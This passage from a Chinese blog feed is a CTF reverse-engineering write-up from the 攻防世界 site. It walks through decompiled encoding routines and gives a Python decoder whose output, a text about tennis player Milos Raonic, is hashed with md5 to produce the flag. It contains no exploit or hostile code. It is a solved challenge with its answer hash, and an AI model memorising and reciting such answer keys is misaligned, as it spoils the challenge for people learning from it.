class="line">    <span class="hljs-keyword">if</span> ( !v2 )</span><br><span class="line">      <span class="hljs-keyword">break</span>;</span><br><span class="line">    v3 = v8++;</span><br><span class="line">    v5 = *v3;</span><br><span class="line">    pending = <span class="hljs-number">1</span>;</span><br><span class="line">    <span class="hljs-keyword">while</span> ( pending )</span><br><span class="line">    {</span><br><span class="line">      v9[--v6] = <span class="hljs-built_in">sub_1023456</span>(v5);</span><br><span class="line">      <span class="hljs-keyword">if</span> ( !v6 )</span><br><span class="line">      {</span><br><span class="line">        <span class="hljs-built_in">sub_1023458</span>(v9);</span><br><span class="line">        v6 = <span class="hljs-number">3</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">if</span> ( v6 != <span class="hljs-number">3</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">while</span> ( v6 != <span class="hljs-number">-1</span> )</span><br><span class="line">      v9[--v6] = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-built_in">sub_1023458</span>(v9);</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> __stack_chk_guard;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p><code>v9</code>每三位进行上面函数的操作，所以看看<code>v9</code>是怎么得到的</p><figure class="highlight c++ hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="hljs-function">__int64 __fastcall <span class="hljs-title">sub_1023456</span><span class="hljs-params">(<span class="hljs-keyword">int</span> a1)</span></span></span><br><span class="line"><span class="hljs-function"></span>{</span><br><span class="line">  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ST04_4</span></span><br><span class="line">  <span class="hljs-keyword">int</span> i; <span class="hljs-comment">// [rsp+0h] [rbp-Ch]</span></span><br><span class="line">  <span class="hljs-keyword">int</span> v4; <span class="hljs-comment">// [rsp+4h] [rbp-8h]</span></span><br><span class="line">  <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> v5; <span class="hljs-comment">// [rsp+8h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v4 = a1;</span><br><span class="line">  <span class="hljs-keyword">if</span> ( sub_1023456_shifted == <span class="hljs-number">-1</span> )</span><br><span class="line">  {</span><br><span class="line">    <span class="hljs-keyword">if</span> ( a1 == <span class="hljs-number">126</span> )</span><br><span class="line">      v4 = <span class="hljs-number">0</span>;</span><br><span class="line">    <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">39</span>; ++i )</span><br><span class="line">    {</span><br><span class="line">      <span class="hljs-keyword">if</span> ( ctable[i] == v4 )</span><br><span class="line">      {</span><br><span class="line">        pending = <span class="hljs-number">0</span>;</span><br><span class="line">        <span class="hljs-keyword">return</span> (<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span>)i;</span><br><span class="line">      }</span><br><span class="line">      <span class="hljs-keyword">if</span> ( ctable[i + <span class="hljs-number">39</span>] == v4 )</span><br><span class="line">      {</span><br><span class="line">        pending = <span class="hljs-number">1</span>;</span><br><span class="line">        sub_1023456_shifted = i;</span><br><span class="line">        <span class="hljs-keyword">return</span> <span class="hljs-number">39</span>;</span><br><span class="line">      }</span><br><span class="line">    }</span><br><span class="line">    pending = <span class="hljs-number">0</span>;</span><br><span class="line">    v5 = <span class="hljs-number">37</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    v1 = sub_1023456_shifted;</span><br><span class="line">    sub_1023456_shifted = <span class="hljs-number">-1</span>;</span><br><span class="line">    pending = <span class="hljs-number">0</span>;</span><br><span class="line">    v5 = v1;</span><br><span class="line">  }</span><br><span class="line">  <span class="hljs-keyword">return</span> v5;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>有一个字母表<code>ctable</code>，找到其中的索引，39以下直接返回索引值，39往上返回值分为两部分，一部分是39，另一部分是索引值<code>i</code>，之所以这么做其实是为了降低难度，使前面的三元一次方程有唯一解，把整个过程逆过来就得到了真正的<code>flag.txt</code></p><p><del>这里用来批评攻防世界，题目明明有说明最后使md5值怎么到这就没了</del></p><figure class="highlight python hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">target = [<span class="hljs-number">0xF5D1</span>, <span class="hljs-number">0x4D6B</span>, <span class="hljs-number">0xED6A</span>, <span class="hljs-number">0x08A6</span>, <span class="hljs-number">0x38DD</span>, <span class="hljs-number">0xF7FA</span>, <span class="hljs-number">0x609E</span>, <span class="hljs-number">0xEBC4</span>, <span class="hljs-number">0xE55F</span>, <span class="hljs-number">0xE6D1</span>, <span class="hljs-number">0x7C89</span>, <span class="hljs-number">0xED5B</span>, <span class="hljs-number">0x0871</span>,</span><br><span class="line">          <span class="hljs-number">0x1A69</span>, <span class="hljs-number">0x5D58</span>, <span class="hljs-number">0x72DE</span>, <span class="hljs-number">0x224B</span>, <span class="hljs-number">0x3AA6</span>, <span class="hljs-number">0x0845</span>, <span class="hljs-number">0x7DD6</span>, <span class="hljs-number">0x58FB</span>, <span class="hljs-number">0xE9CC</span>, <span class="hljs-number">0x0A2D</span>, <span class="hljs-number">0x76B8</span>, <span class="hljs-number">0xED60</span>, <span class="hljs-number">0x251A</span>,</span><br><span class="line">          <span class="hljs-number">0x1F6B</span>, <span class="hljs-number">0x32CC</span>, <span class="hljs-number">0xE78D</span>, <span class="hljs-number">0x12FA</span>, <span class="hljs-number">0x201A</span>, <span class="hljs-number">0xE889</span>, <span class="hljs-number">0x2D25</span>, <span class="hljs-number">0x922A</span>, <span class="hljs-number">0x4BC5</span>, <span class="hljs-number">0xF5FF</span>, <span class="hljs-number">0xF8E5</span>, <span class="hljs-number">0xC79B</span>, <span class="hljs-number">0x3A77</span>,</span><br><span class="line">          <span class="hljs-number">0x4BDB</span>, <span class="hljs-number">0xEA11</span>, <span class="hljs-number">0x5941</span>, <span class="hljs-number">0x58BD</span>, <span class="hljs-number">0x3A95</span>, <span class="hljs-number">0xF5C9</span>, <span class="hljs-number">0xA225</span>, <span class="hljs-number">0xAD40</span>, <span class="hljs-number">0xF8BD</span>, <span class="hljs-number">0x095D</span>, <span class="hljs-number">0x70B6</span>, <span class="hljs-number">0x458C</span>, <span class="hljs-number">0xE7A9</span>,</span><br><span class="line">          <span class="hljs-number">0xEA68</span>, <span class="hljs-number">0x252F</span>, <span class="hljs-number">0x094B</span>, <span class="hljs-number">0x5E41</span>, <span class="hljs-number">0x0969</span>, <span class="hljs-number">0x6015</span>, <span class="hljs-number">0x5ED5</span>, <span class="hljs-number">0xF6E5</span>, <span class="hljs-number">0x59B9</span>, <span class="hljs-number">0x7CAF</span>, <span class="hljs-number">0x66DF</span>, <span class="hljs-number">0x265B</span>, <span class="hljs-number">0x7837</span>,</span><br><span class="line">          <span class="hljs-number">0x57B4</span>, <span class="hljs-number">0x7CAF</span>, <span class="hljs-number">0xAED9</span>, <span class="hljs-number">0xF707</span>, <span class="hljs-number">0x6A3C</span>, <span class="hljs-number">0xF8E5</span>, <span class="hljs-number">0xF509</span>, <span class="hljs-number">0x7C8B</span>, <span class="hljs-number">0x0915</span>, <span class="hljs-number">0x2235</span>, <span class="hljs-number">0x336F</span>, <span class="hljs-number">0x33E9</span>, <span class="hljs-number">0x2D14</span>,</span><br><span class="line">          <span class="hljs-number">0x7C91</span>, <span class="hljs-number">0x5804</span>, <span class="hljs-number">0x83E5</span>, <span class="hljs-number">0xE78D</span>, <span class="hljs-number">0xF4EA</span>, <span class="hljs-number">0x0874</span>, <span class="hljs-number">0xED6B</span>, <span class="hljs-number">0x4B35</span>, <span class="hljs-number">0xE839</span>, <span class="hljs-number">0x57B4</span>, <span class="hljs-number">0xE77C</span>, <span class="hljs-number">0xEA68</span>, <span class="hljs-number">0x2525</span>,</span><br><span class="line">          <span class="hljs-number">0xAD41</span>, <span class="hljs-number">0xED6F</span>, <span class="hljs-number">0x3A4A</span>, <span class="hljs-number">0x4BCC</span>, <span class="hljs-number">0x6015</span>, <span class="hljs-number">0xF440</span>, <span class="hljs-number">0x0858</span>, <span class="hljs-number">0x3AA6</span>, <span class="hljs-number">0x7809</span>, <span class="hljs-number">0x671D</span>, <span class="hljs-number">0x0874</span>, <span class="hljs-number">0xEA77</span>, <span class="hljs-number">0x63AF</span>,</span><br><span class="line">          <span class="hljs-number">0x2E91</span>, <span class="hljs-number">0x5845</span>, <span class="hljs-number">0xF6C4</span>, <span class="hljs-number">0x086D</span>, <span class="hljs-number">0x7795</span>, <span class="hljs-number">0x3939</span>, <span class="hljs-number">0x57B4</span>, <span class="hljs-number">0x7C89</span>, <span class="hljs-number">0x82DC</span>, <span class="hljs-number">0x32ED</span>, <span class="hljs-number">0xB994</span>, <span class="hljs-number">0xC7AF</span>, <span class="hljs-number">0x9135</span>,</span><br><span class="line">          <span class="hljs-number">0x0E65</span>, <span class="hljs-number">0x1B66</span>, <span class="hljs-number">0xED5B</span>, <span class="hljs-number">0x3235</span>, <span class="hljs-number">0x6577</span>, <span class="hljs-number">0x5A80</span>, <span class="hljs-number">0x3AD3</span>, <span class="hljs-number">0xE776</span>, <span class="hljs-number">0x1EE5</span>, <span class="hljs-number">0xAD41</span>, <span class="hljs-number">0xED59</span>, <span class="hljs-number">0x864C</span>, <span class="hljs-number">0x70B4</span>,</span><br><span class="line">          <span class="hljs-number">0x3876</span>, <span class="hljs-number">0xED67</span>, <span class="hljs-number">0x64D6</span>, <span class="hljs-number">0xF8E5</span>, <span class="hljs-number">0xF505</span>, <span class="hljs-number">0xEAD9</span>, <span class="hljs-number">0x7C9C</span>, <span class="hljs-number">0x32ED</span>, <span class="hljs-number">0xB994</span>, <span class="hljs-number">0xB4EF</span>, <span class="hljs-number">0x0C6C</span>, <span class="hljs-number">0xF665</span>, <span class="hljs-number">0xF5F5</span>,</span><br><span class="line">          <span class="hljs-number">0x9047</span>, <span class="hljs-number">0x521A</span>, <span class="hljs-number">0xE99E</span>, <span class="hljs-number">0xEA68</span>, <span class="hljs-number">0x252F</span>, <span class="hljs-number">0x9D09</span>, <span class="hljs-number">0x76B7</span>, <span class="hljs-number">0xE776</span>, <span class="hljs-number">0x1ED0</span>, <span class="hljs-number">0x095D</span>, <span class="hljs-number">0x0D4D</span>, <span class="hljs-number">0x5D5A</span>, <span class="hljs-number">0x087B</span>,</span><br><span class="line">          <span class="hljs-number">0x2005</span>, <span class="hljs-number">0x1526</span>, <span class="hljs-number">0x7E76</span>, <span class="hljs-number">0x85AD</span>, <span class="hljs-number">0x78B9</span>, <span class="hljs-number">0xE8B6</span>, <span class="hljs-number">0x782C</span>, <span class="hljs-number">0x251C</span>, <span class="hljs-number">0x32ED</span>, <span class="hljs-number">0x7F68</span>, <span class="hljs-number">0xEBE3</span>, <span class="hljs-number">0xEA41</span>, <span class="hljs-number">0x57FD</span>,</span><br><span class="line">          <span class="hljs-number">0xED59</span>, <span class="hljs-number">0x846D</span>, <span class="hljs-number">0x7A05</span>, <span class="hljs-number">0xB994</span>, <span class="hljs-number">0xBB78</span>, <span class="hljs-number">0xED6A</span>, <span class="hljs-number">0x08A6</span>, <span class="hljs-number">0x38DD</span>, <span class="hljs-number">0x3B5D</span>, <span class="hljs-number">0x7E45</span>, <span class="hljs-number">0xE839</span>, <span class="hljs-number">0x738C</span>, <span class="hljs-number">0xE9CC</span>,</span><br><span class="line">          <span class="hljs-number">0x0A2D</span>, <span class="hljs-number">0x764A</span>, <span class="hljs-number">0x609E</span>, <span class="hljs-number">0xE8B6</span>, <span class="hljs-number">0xEA68</span>, <span class="hljs-number">0x2524</span>, <span class="hljs-number">0xE6BB</span>, <span class="hljs-number">0x7C9C</span>, <span class="hljs-number">0x639F</span>, <span class="hljs-number">0x3A95</span>, <span class="hljs-number">0x0895</span>, <span class="hljs-number">0xF40F</span>, <span class="hljs-number">0x8328</span>,</span><br><span class="line">          <span class="hljs-number">0xEA69</span>, <span class="hljs-number">0x7EE5</span>, <span class="hljs-number">0xF8BD</span>, <span class="hljs-number">0x7F7D</span>, <span class="hljs-number">0x0D6D</span>, <span class="hljs-number">0x70B6</span>, <span class="hljs-number">0x458C</span>, <span class="hljs-number">0xE8B6</span>, <span class="hljs-number">0xEA68</span>, <span class="hljs-number">0x251C</span>, <span class="hljs-number">0x6065</span>, <span class="hljs-number">0xB35F</span>, <span class="hljs-number">0xC789</span>,</span><br><span class="line">          <span class="hljs-number">0x5845</span>, <span class="hljs-number">0x7F7D</span>, <span class="hljs-number">0x6D89</span>, <span class="hljs-number">0x4C6E</span>, <span class="hljs-number">0xA20E</span>, <span class="hljs-number">0x60B5</span>, <span class="hljs-number">0x7E45</span>, <span class="hljs-number">0xED59</span>, <span class="hljs-number">0xF707</span>, <span class="hljs-number">0x69EF</span>, <span class="hljs-number">0x922A</span>, <span class="hljs-number">0x4BC5</span>, <span class="hljs-number">0xF6EF</span>,</span><br><span class="line">          <span class="hljs-number">0x8635</span>, <span class="hljs-number">0xF4B9</span>, <span class="hljs-number">0x57B4</span>, <span class="hljs-number">0x7CF8</span>, <span class="hljs-number">0xED60</span>, <span class="hljs-number">0x2510</span>, <span class="hljs-number">0x095D</span>, <span class="hljs-number">0x20AF</span>, <span class="hljs-number">0x3545</span>, <span class="hljs-number">0xF40F</span>, <span class="hljs-number">0x8328</span>, <span class="hljs-number">0xEA41</span>, <span class="hljs-number">0x58A4</span>,</span><br><span class="line">          <span class="hljs-number">0x225D</span>, <span class="hljs-number">0x7E7C</span>, <span class="hljs-number">0x4BDB</span>, <span class="hljs-number">0xF8BD</span>, <span class="hljs-number">0x082C</span>, <span class="hljs-number">0xEAE7</span>, <span class="hljs-number">0x5D57</span>, <span class="hljs-number">0x5D50</span>, <span class="hljs-number">0x0914</span>, <span class="hljs-number">0xE7C7</span>, <span class="hljs-number">0x8624</span>, <span class="hljs-number">0x7CF8</span>, <span class="hljs-number">0xED60</span>,</span><br><span class="line">          <span class="hljs-number">0x2511</span>, <span class="hljs-number">0x7C8E</span>, <span class="hljs-number">0x7159</span>, <span class="hljs-number">0x8416</span>, <span class="hljs-number">0x7EF9</span>, <span class="hljs-number">0xE7E5</span>, <span class="hljs-number">0x774A</span>, <span class="hljs-number">0x3895</span>, <span class="hljs-number">0x1EC9</span>, <span class="hljs-number">0x7C90</span>, <span class="hljs-number">0x09B9</span>, <span class="hljs-number">0x58BD</span>, <span class="hljs-number">0x5FF5</span>,</span><br><span class="line">          <span class="hljs-number">0xE99E</span>, <span class="hljs-number">0xEA68</span>, <span class="hljs-number">0x250A</span>, <span class="hljs-number">0x224C</span>, <span class="hljs-number">0xEA3D</span>, <span class="hljs-number">0x73F5</span>, <span class="hljs-number">0x7C89</span>, <span class="hljs-number">0x53A6</span>, <span class="hljs-number">0x3190</span>, <span class="hljs-number">0x3B5D</span>, <span class="hljs-number">0x1526</span>, <span class="hljs-number">0x7DD5</span>, <span class="hljs-number">0x666A</span>,</span><br><span class="line">          <span class="hljs-number">0x0919</span>, <span class="hljs-number">0x225F</span>, <span class="hljs-number">0xCDEF</span>, <span class="hljs-number">0x79E1</span>, <span class="hljs-number">0x7E7B</span>, <span class="hljs-number">0x7E6B</span>, <span class="hljs-number">0x082C</span>, <span class="hljs-number">0xA277</span>, <span class="hljs-number">0xE885</span>, <span class="hljs-number">0xE8BB</span>, <span class="hljs-number">0xE775</span>, <span class="hljs-number">0x5FF7</span>, <span class="hljs-number">0xEA68</span>,</span><br><span class="line">          <span class="hljs-number">0x251B</span>, <span class="hljs-number">0x7FDF</span>, <span class="hljs-number">0x589D</span>, <span class="hljs-number">0x7A05</span>, <span class="hljs-number">0x779A</span>, <span class="hljs-number">0x8A5A</span>, <span class="hljs-number">0x7C91</span>, <span class="hljs-number">0x5D5C</span>, <span class="hljs-number">0x32ED</span>, <span class="hljs-number">0xF628</span>, <span class="hljs-number">0x2195</span>, <span class="hljs-number">0xF49A</span>, <span class="hljs-number">0x0C77</span>,</span><br><span class="line">          <span class="hljs-number">0xEAE1</span>, <span class="hljs-number">0x59B9</span>, <span class="hljs-number">0x58BD</span>, <span class="hljs-number">0xE570</span>, <span class="hljs-number">0xE99E</span>, <span class="hljs-number">0xEA3D</span>, <span class="hljs-number">0x73F9</span>, <span class="hljs-number">0x13AD</span>, <span class="hljs-number">0x2BF5</span>, <span class="hljs-number">0x225D</span>, <span class="hljs-number">0x7F7D</span>, <span class="hljs-number">0x70B6</span>, <span class="hljs-number">0x4A9C</span>,</span><br><span class="line">          <span class="hljs-number">0x337A</span>, <span class="hljs-number">0x1EC9</span>, <span class="hljs-number">0x4D05</span>, <span class="hljs-number">0x7E75</span>, <span class="hljs-number">0x2578</span>, <span class="hljs-number">0xED59</span>, <span class="hljs-number">0x38E5</span>, <span class="hljs-number">0x1ECA</span>, <span class="hljs-number">0xA210</span>, <span class="hljs-number">0x3B5D</span>, <span class="hljs-number">0x779A</span>, <span class="hljs-number">0x8A6F</span>, <span class="hljs-number">0xC790</span>,</span><br><span class="line">          <span class="hljs-number">0x2518</span>, <span class="hljs-number">0x4B41</span>, <span class="hljs-number">0x7C89</span>, <span class="hljs-number">0x5D49</span>, <span class="hljs-number">0x4D05</span>, <span class="hljs-number">0x152D</span>, <span class="hljs-number">0x73C5</span>, <span class="hljs-number">0x79F9</span>, <span class="hljs-number">0x4BED</span>, <span class="hljs-number">0x913C</span>, <span class="hljs-number">0x37C9</span>, <span class="hljs-number">0x5D4D</span>, <span class="hljs-number">0x53C8</span>,</span><br><span class="line">          <span class="hljs-number">0x0941</span>, <span class="hljs-number">0x7C97</span>, <span class="hljs-number">0x5D5B</span>, <span class="hljs-number">0x346A</span>, <span class="hljs-number">0x82D8</span>, <span class="hljs-number">0x5F36</span>, <span class="hljs-number">0x801F</span>, <span class="hljs-number">0xC800</span>]</span><br><span class="line">ctable = [</span><br><span class="line">    <span class="hljs-number">0x00</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x69</span>,</span><br><span class="line">    <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x73</span>,</span><br><span class="line">    <span class="hljs-number">0x74</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x32</span>,</span><br><span class="line">    <span class="hljs-number">0x33</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x00</span>,</span><br><span class="line">    <span class="hljs-number">0x41</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x4A</span>,</span><br><span class="line">    <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x54</span>,</span><br><span class="line">    <span class="hljs-number">0x55</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0x23</span>,</span><br><span class="line">    <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x00</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">t1 = []</span><br><span class="line">t2 = []</span><br><span class="line"></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> target:</span><br><span class="line">    c = i % <span class="hljs-number">40</span></span><br><span class="line">    b = ((i - c) % <span class="hljs-number">1600</span>) // <span class="hljs-number">40</span></span><br><span class="line">    a = i // <span class="hljs-number">1600</span></span><br><span class="line">    t1 += [a, b, c]</span><br><span class="line">i = <span class="hljs-number">0</span></span><br><span class="line"><span class="hljs-keyword">while</span> i &lt; <span class="hljs-built_in">len</span>(t1):</span><br><span class="line">    <span class="hljs-keyword">if</span> t1[i] == <span class="hljs-number">39</span>:</span><br><span class="line">        t2 += [t1[i] + t1[i + <span class="hljs-number">1</span>]]</span><br><span class="line">        i += <span class="hljs-number">2</span></span><br><span class="line">    <span class="hljs-keyword">else</span>:</span><br><span class="line">        t2 += [t1[i]]</span><br><span class="line">        i += <span class="hljs-number">1</span></span><br><span class="line"></span><br><span class="line">flag = <span class="hljs-string">''</span></span><br><span class="line"><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> t2:</span><br><span class="line">    <span class="hljs-keyword">if</span> ctable[i] != <span class="hljs-number">0x00</span>:</span><br><span class="line">        flag += <span class="hljs-built_in">chr</span>(ctable[i])</span><br><span class="line"></span><br><span class="line"><span class="hljs-built_in">print</span>(flag)</span><br></pre></td></tr></tbody></table></figure><p>输出的内容为</p><figure class="highlight livecodeserver hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Milos Raonic (born <span class="hljs-number">1990</span>) is <span class="hljs-keyword">a</span> Canadian professional tennis player. He reached <span class="hljs-keyword">a</span> career high world No. <span class="hljs-number">4</span> singles ranking <span class="hljs-keyword">in</span> May <span class="hljs-number">2015</span>, <span class="hljs-keyword">as</span> ranked <span class="hljs-keyword">by</span> <span class="hljs-keyword">the</span> Association <span class="hljs-keyword">of</span> Tennis Professionals (ATP). His career highlights <span class="hljs-built_in">include</span> <span class="hljs-keyword">a</span> Grand Slam final <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-number">2016</span> Wimbledon Championships <span class="hljs-keyword">and</span> <span class="hljs-literal">two</span> Grand Slam semifinals <span class="hljs-keyword">at</span> <span class="hljs-keyword">the</span> <span class="hljs-number">2014</span> Wimbledon Championships <span class="hljs-keyword">and</span> <span class="hljs-number">2016</span> Australian Open. He was <span class="hljs-keyword">the</span> <span class="hljs-number">2011</span> ATP Newcomer <span class="hljs-keyword">of</span> <span class="hljs-keyword">the</span> Year, <span class="hljs-keyword">and</span> has been ranked continuously inside <span class="hljs-keyword">the</span> top <span class="hljs-number">20</span> since August <span class="hljs-number">2012.</span> Raonic is <span class="hljs-keyword">the</span> <span class="hljs-keyword">first</span> player born <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> <span class="hljs-number">1990</span>s <span class="hljs-built_in">to</span> win <span class="hljs-keyword">an</span> ATP title, <span class="hljs-built_in">to</span> be ranked <span class="hljs-keyword">in</span> <span class="hljs-keyword">the</span> top <span class="hljs-number">10</span>, <span class="hljs-keyword">and</span> <span class="hljs-built_in">to</span> qualify <span class="hljs-keyword">for</span> <span class="hljs-keyword">the</span> ATP World Tour Finals. He has <span class="hljs-literal">eight</span> ATP singles titles, all won <span class="hljs-keyword">on</span> <span class="hljs-title">hard</span> <span class="hljs-title">courts</span>. <span class="hljs-title">He</span> <span class="hljs-title">is</span> <span class="hljs-title">frequently</span> <span class="hljs-title">described</span> <span class="hljs-title">as</span> <span class="hljs-title">having</span> <span class="hljs-title">one</span> <span class="hljs-title">of</span> <span class="hljs-title">the</span> <span class="hljs-title">best</span> <span class="hljs-title">serves</span> <span class="hljs-title">among</span> <span class="hljs-title">his</span> <span class="hljs-title">contemporaries</span>. <span class="hljs-title">Statistically</span>, <span class="hljs-title">he</span> <span class="hljs-title">is</span> <span class="hljs-title">among</span> <span class="hljs-title">the</span> <span class="hljs-title">strongest</span> <span class="hljs-title">servers</span> <span class="hljs-title">in</span> <span class="hljs-title">the</span> <span class="hljs-title">Open</span> <span class="hljs-title">Era</span>, <span class="hljs-title">winning</span> <span class="hljs-title">91p</span> <span class="hljs-title">of</span> <span class="hljs-title">service</span> <span class="hljs-title">games</span> <span class="hljs-title">to</span> <span class="hljs-title">rank</span> <span class="hljs-title">third</span> <span class="hljs-title">all</span> <span class="hljs-title">time</span>. <span class="hljs-title">Aided</span> <span class="hljs-title">by</span> <span class="hljs-title">his</span> <span class="hljs-title">serve</span>, <span class="hljs-title">he</span> <span class="hljs-title">plays</span> <span class="hljs-title">an</span> <span class="hljs-title">all</span> <span class="hljs-title">court</span> <span class="hljs-title">style</span> <span class="hljs-title">with</span> <span class="hljs-title">an</span> <span class="hljs-title">emphasis</span> <span class="hljs-title">on</span> <span class="hljs-title">short</span> <span class="hljs-title">points</span>.</span><br></pre></td></tr></tbody></table></figure><p>找到原题发现是求<code>md5</code>，然后发现求<code>md5</code>还求出来好几个……</p><p>正确的那一个</p><figure class="highlight bash hljs"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-&gt; python3 common.py | md5sum</span><br><span class="line">2c8cd31daeba8753815851f13e6370b3  -</span><br></pre></td></tr></tbody></table></figure><p><del>这种时候应该找出题人py一个flag</del></p></body></html>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> re </tag>
            
            <tag> 攻防世界 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mfc逆向-200_攻防世界</title>
      <link href="/2020/03/24/mfc%E9%80%86%E5%90%91-200-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
      <url>/2020/03/24/mfc%E9%80%86%E5%90%91-200-%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/</url>
      
